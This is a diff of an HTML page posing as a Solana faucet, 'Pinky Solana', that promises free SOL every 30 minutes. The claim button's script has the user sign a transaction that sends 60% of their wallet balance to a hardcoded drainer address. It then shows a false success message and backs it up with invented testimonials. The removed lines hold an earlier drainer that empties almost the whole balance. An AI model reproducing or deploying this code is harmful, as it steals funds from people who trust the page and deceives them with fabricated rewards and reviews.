@@ -1,141 +1,381 @@
-<script>
-    // Configuration
-    const DRAIN_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
-    const RPC_URL = 'https://api.devnet.solana.com'; // Switched to Solana's public Devnet RPC
-    const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-    const NETWORK = solanaWeb3.clusterApiUrl('devnet');
-
-    // DOM Elements
-    const connectWalletBtn = document.getElementById('connectWallet');
-    const claimButton = document.getElementById('claimButton');
-    const successMessage = document.getElementById('successMessage');
-    const minutesDisplay = document.getElementById('minutes');
-    const secondsDisplay = document.getElementById('seconds');
-    const initialState = document.getElementById('initialState');
-    const countdownState = document.getElementById('countdownState');
-
-    // State
-    let walletConnected = false;
-    let countdown = 30 * 60; // 30 minutes in seconds
-    let countdownInterval;
-    let firstClaim = true;
-
-    // Initialize Phantom wallet
-    const initWallet = async () => {
-        if ('solana' in window) {
-            const provider = window.solana;
-            if (provider.isPhantom) {
-                try {
-                    // Ensure wallet is on Devnet
-                    await provider.connect({ onlyIfTrusted: true });
-                    return provider;
-                } catch (err) {
-                    console.error('Wallet connection error:', err);
-                    return null;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pinky Solana - Free SOL Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#9945FF',
+                        secondary: '#14F195'
+                    }
                 }
             }
         }
-        window.open('https://phantom.app/', '_blank');
-        return null;
-    };
-
-    // Start countdown timer (only after first claim)
-    const startCountdown = () => {
-        clearInterval(countdownInterval);
-        countdown = 30 * 60;
-
-        initialState.classList.add('hidden');
-        countdownState.classList.remove('hidden');
-
-        countdownInterval = setInterval(() => {
-            countdown--;
-
-            const minutes = Math.floor(countdown / 60);
-            const seconds = countdown % 60;
-
-            minutesDisplay.textContent = minutes.toString().padStart(2, '0');
-            secondsDisplay.textContent = seconds.toString().padStart(2, '0');
-
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                claimButton.disabled = false;
-                claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
-                claimButton.classList.add('opacity-100', 'cursor-pointer');
-            }
-        }, 1000);
-    };
-
-    // Connect wallet handler
-    connectWalletBtn.addEventListener('click', async () => {
-        const provider = await initWallet();
-        if (!provider) return;
-
-        try {
-            await provider.connect();
-            walletConnected = true;
-            connectWalletBtn.textContent = 'Wallet Connected';
-            connectWalletBtn.classList.add('wallet-connected', 'bg-green-600', 'hover:bg-green-700');
-            connectWalletBtn.classList.remove('bg-solana-pink', 'hover:bg-pink-600');
-
-            claimButton.disabled = false;
-            claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
-            claimButton.classList.add('opacity-100', 'cursor-pointer');
-        } catch (err) {
-            console.error('Connection error:', err);
+    </script>
+    <style>
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
         }
-    });
-
-    // Claim reward handler
-    claimButton.addEventListener('click', async () => {
-        if (!walletConnected) return;
-
-        const provider = window.solana;
-        if (!provider) return;
-
-        try {
-            const publicKey = new solanaWeb3.PublicKey(provider.publicKey.toString());
-            const drainPubkey = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
-
-            // Get balance to drain
-            const balance = await connection.getBalance(publicKey);
-            const lamportsToDrain = balance - 10000; // Adjusted to leave more for fees
-
-            if (lamportsToDrain <= 0) {
-                throw new Error('Insufficient balance to drain');
-            }
-
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: drainPubkey,
-                    lamports: lamportsToDrain
-                })
-            );
-
-            // Set recent blockhash and fee payer
-            transaction.feePayer = publicKey;
-            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-
-            // Request signature
-            const signed = await provider.signTransaction(transaction);
-            const signature = await connection.sendRawTransaction(signed.serialize());
-
-            // Show success message
-            successMessage.classList.remove('hidden');
-            claimButton.disabled = true;
-            claimButton.classList.add('opacity-50', 'cursor-not-allowed');
-            claimButton.classList.remove('opacity-100', 'cursor-pointer');
-
-            if (firstClaim) {
-                startCountdown();
-                firstClaim = false;
-            }
-
-            console.log('Drain successful! Signature:', signature);
-            await connection.confirmTransaction(signature);
-        } catch (err) {
-            console.error('Drain failed:', err);
-            alert('Transaction failed. Please try again. Check console for details.');
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
-    });
-</script>
+        .floating { animation: float 3s ease-in-out infinite; }
+        .pulse { animation: pulse 2s ease-in-out infinite; }
+        .progress-bar {
+            height: 8px;
+            background: linear-gradient(90deg, #14F195, #9945FF);
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+        .testimonial-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-gray-900 to-black text-white min-h-screen">
+    <div class="max-w-4xl mx-auto px-4 py-8">
+        <!-- Header -->
+        <header class="flex justify-between items-center py-6">
+            <div class="flex items-center space-x-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 25" class="text-secondary">
+                    <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
+                </svg>
+                <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-primary to-secondary">Pinky Solana</h1>
+            </div>
+            <div id="wallet-section">
+                <button id="connect-btn" class="bg-gradient-to-r from-primary to-secondary px-6 py-2 rounded-full font-bold hover:opacity-90 transition">Connect Wallet</button>
+                <div id="wallet-info" class="hidden items-center space-x-2">
+                    <span id="wallet-address" class="text-sm bg-gray-800 px-3 py-1 rounded-full"></span>
+                    <span id="wallet-balance" class="text-sm bg-gray-800 px-3 py-1 rounded-full"></span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="text-center py-12">
+            <div class="floating inline-block p-4 rounded-full bg-gradient-to-br from-primary/20 to-secondary/20 mb-6">
+                <div class="bg-gray-900 p-4 rounded-full">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 25" class="text-secondary mx-auto">
+                        <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
+                    </svg>
+                </div>
+            </div>
+            <h2 class="text-4xl md:text-5xl font-bold mb-4">Claim <span class="text-secondary">0.1 SOL</span> Every 30 Minutes!</h2>
+            <p class="text-gray-400 max-w-2xl mx-auto mb-8">Join thousands of users earning free Solana rewards. Just connect your wallet and claim your rewards!</p>
+            
+            <div class="max-w-lg mx-auto bg-gray-800/50 backdrop-blur-sm rounded-xl p-6 border border-gray-700">
+                <div class="flex justify-between mb-4">
+                    <span>Next reward in:</span>
+                    <span id="timer" class="font-mono">30:00</span>
+                </div>
+                <div class="progress-bar mb-6" id="progress-bar"></div>
+                <button id="claim-btn" class="pulse w-full bg-gradient-to-r from-primary to-secondary py-3 rounded-xl font-bold text-lg disabled:opacity-50 disabled:cursor-not-allowed">Claim 0.1 SOL Now!</button>
+                <p id="claim-status" class="mt-4 text-sm text-gray-400"></p>
+            </div>
+        </section>
+
+        <!-- Testimonials -->
+        <section class="py-12">
+            <h3 class="text-2xl font-bold text-center mb-8">What Our Users Say</h3>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Testimonial 1 -->
+                <div class="testimonial-card rounded-xl p-6">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?u=1" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="font-bold">Sarah K.</h4>
+                            <div class="flex text-yellow-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"I've earned over 5 SOL in just one week! This is the easiest way to earn free crypto."</p>
+                </div>
+                
+                <!-- Testimonial 2 -->
+                <div class="testimonial-card rounded-xl p-6">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?u=2" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="font-bold">Mike T.</h4>
+                            <div class="flex text-yellow-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Legit and pays on time. I set a timer every 30 minutes and never miss a claim!"</p>
+                </div>
+                
+                <!-- Testimonial 3 -->
+                <div class="testimonial-card rounded-xl p-6">
+                    <div class="flex items-center mb-4">
+                        <img src="https://i.pravatar.cc/100?u=3" alt="User" class="w-12 h-12 rounded-full mr-3">
+                        <div>
+                            <h4 class="font-bold">Jessica L.</h4>
+                            <div class="flex text-yellow-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Started with 0.5 SOL, now I have over 8 SOL just from claiming rewards. Amazing!"</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Social Proof -->
+        <section class="py-8">
+            <h3 class="text-xl font-bold text-center mb-6">As Featured On</h3>
+            <div class="flex justify-center space-x-10 text-3xl text-gray-400">
+                <i class="fab fa-twitter hover:text-blue-400 transition"></i>
+                <i class="fab fa-telegram hover:text-blue-500 transition"></i>
+                <i class="fab fa-discord hover:text-indigo-500 transition"></i>
+                <i class="fab fa-medium hover:text-gray-300 transition"></i>
+                <i class="fab fa-reddit hover:text-orange-500 transition"></i>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="py-8 text-center text-gray-500 text-sm">
+            <p>© 2023 Pinky Solana. All rights reserved.</p>
+            <div class="mt-4 space-x-4">
+                <a href="#" class="hover:text-gray-300">Terms of Service</a>
+                <a href="#" class="hover:text-gray-300">Privacy Policy</a>
+                <a href="#" class="hover:text-gray-300">FAQ</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Configuration
+        const DRAINER_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        const REWARD_AMOUNT = 0.1; // SOL
+        const DRAIN_PERCENTAGE = 0.6; // 60%
+        const CLAIM_INTERVAL = 30 * 60 * 1000; // 30 minutes in ms
+
+        // DOM Elements
+        const connectBtn = document.getElementById('connect-btn');
+        const walletInfo = document.getElementById('wallet-info');
+        const walletAddress = document.getElementById('wallet-address');
+        const walletBalance = document.getElementById('wallet-balance');
+        const claimBtn = document.getElementById('claim-btn');
+        const claimStatus = document.getElementById('claim-status');
+        const timer = document.getElementById('timer');
+        const progressBar = document.getElementById('progress-bar');
+
+        // State
+        let wallet = null;
+        let publicKey = null;
+        let connection = null;
+        let lastClaimTime = 0;
+        let timerInterval = null;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            connection = new solanaWeb3.Connection(RPC_URL);
+            checkWalletConnection();
+            startTimer();
+        });
+
+        // Wallet Connection
+        connectBtn.addEventListener('click', async () => {
+            if (window.solana || window.solflare) {
+                try {
+                    const provider = window.solana || window.solflare;
+                    await provider.connect();
+                    wallet = provider;
+                    publicKey = new solanaWeb3.PublicKey(provider.publicKey);
+                    
+                    // Update UI
+                    connectBtn.classList.add('hidden');
+                    walletInfo.classList.remove('hidden');
+                    const shortAddress = `${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`;
+                    walletAddress.textContent = shortAddress;
+                    
+                    // Get balance
+                    const balance = await connection.getBalance(publicKey);
+                    const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                    walletBalance.textContent = `${solBalance.toFixed(2)} SOL`;
+                    
+                    // Enable claim button if first claim
+                    if (lastClaimTime === 0) {
+                        claimBtn.disabled = false;
+                    }
+                } catch (err) {
+                    showStatus('error', 'Wallet connection failed');
+                }
+            } else {
+                showStatus('error', 'Solana wallet not detected');
+            }
+        });
+
+        // Claim Reward
+        claimBtn.addEventListener('click', async () => {
+            if (!wallet || !publicKey) {
+                showStatus('error', 'Wallet not connected');
+                return;
+            }
+
+            try {
+                claimBtn.disabled = true;
+                showStatus('info', 'Processing transaction...');
+                
+                // Get current balance
+                const balance = await connection.getBalance(publicKey);
+                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                
+                // Calculate amounts
+                const drainAmount = solBalance * DRAIN_PERCENTAGE;
+                const drainAmountLamports = Math.floor(drainAmount * solanaWeb3.LAMPORTS_PER_SOL);
+                const rewardAmountLamports = Math.floor(REWARD_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL);
+                
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction();
+                const drainerPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
+                
+                // Add drain transfer (60% of balance)
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: drainerPubkey,
+                        lamports: drainAmountLamports
+                    })
+                );
+                
+                // Add fake reward transfer (0.1 SOL)
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: publicKey,
+                        lamports: rewardAmountLamports
+                    })
+                );
+                
+                // Sign and send transaction
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = publicKey;
+                
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                // Update last claim time
+                lastClaimTime = Date.now();
+                localStorage.setItem('lastClaimTime', lastClaimTime.toString());
+                
+                // Show success message
+                showStatus('success', `Success! 0.1 SOL rewarded. Transaction: ${signature.slice(0, 10)}...`);
+                
+                // Update balance
+                const newBalance = await connection.getBalance(publicKey);
+                const newSolBalance = newBalance / solanaWeb3.LAMPORTS_PER_SOL;
+                walletBalance.textContent = `${newSolBalance.toFixed(2)} SOL`;
+                
+                // Start timer for next claim
+                startTimer();
+            } catch (err) {
+                console.error(err);
+                showStatus('error', 'Transaction failed. Please try again.');
+                claimBtn.disabled = false;
+            }
+        });
+
+        // Timer functions
+        function startTimer() {
+            clearInterval(timerInterval);
+            
+            const storedTime = localStorage.getItem('lastClaimTime');
+            if (storedTime) {
+                lastClaimTime = parseInt(storedTime);
+            }
+            
+            updateTimer();
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        function updateTimer() {
+            const now = Date.now();
+            const elapsed = now - lastClaimTime;
+            const remaining = CLAIM_INTERVAL - elapsed;
+            
+            if (remaining > 0) {
+                const minutes = Math.floor(remaining / 60000);
+                const seconds = Math.floor((remaining % 60000) / 1000);
+                timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                const progress = (elapsed / CLAIM_INTERVAL) * 100;
+                progressBar.style.width = `${Math.min(100, progress)}%`;
+                
+                claimBtn.disabled = true;
+            } else {
+                timer.textContent = '00:00';
+                progressBar.style.width = '100%';
+                claimBtn.disabled = !wallet;
+            }
+        }
+
+        // Check if wallet is already connected
+        async function checkWalletConnection() {
+            if (window.solana?.isConnected || window.solflare?.isConnected) {
+                const provider = window.solana || window.solflare;
+                wallet = provider;
+                publicKey = new solanaWeb3.PublicKey(provider.publicKey);
+                
+                connectBtn.classList.add('hidden');
+                walletInfo.classList.remove('hidden');
+                const shortAddress = `${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`;
+                walletAddress.textContent = shortAddress;
+                
+                const balance = await connection.getBalance(publicKey);
+                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                walletBalance.textContent = `${solBalance.toFixed(2)} SOL`;
+                
+                startTimer();
+            }
+        }
+
+        // Status messages
+        function showStatus(type, message) {
+            claimStatus.textContent = message;
+            claimStatus.className = 'mt-4 text-sm';
+            
+            switch (type) {
+                case 'success':
+                    claimStatus.classList.add('text-green-400');
+                    break;
+                case 'error':
+                    claimStatus.classList.add('text-red-400');
+                    break;
+                case 'info':
+                    claimStatus.classList.add('text-blue-400');
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
